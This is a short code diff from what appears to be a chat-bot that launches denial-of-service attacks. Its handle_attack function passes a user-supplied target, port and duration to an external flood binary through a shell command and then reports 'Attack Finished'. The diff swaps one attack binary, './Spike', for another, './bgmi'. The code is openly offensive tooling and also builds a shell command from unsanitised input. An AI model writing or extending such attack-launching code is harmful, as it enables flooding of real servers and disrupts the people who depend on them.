@@ -366,7 +366,7 @@ def handle_attack(message):
                 start_attack_reply(message, target, port, attack_time)  # Send attack started message
                 
                 # Run the attack command
-                full_command = f"./Spike {target} {port} {attack_time} 10 1000"
+                full_command = f"./bgmi {target} {port} {attack_time} 150"
                 process = subprocess.run(full_command, shell=True)
                 
                 response = f"✅ Attack Finished. Target: {target} Port: {port} Time: {attack_time} sec"
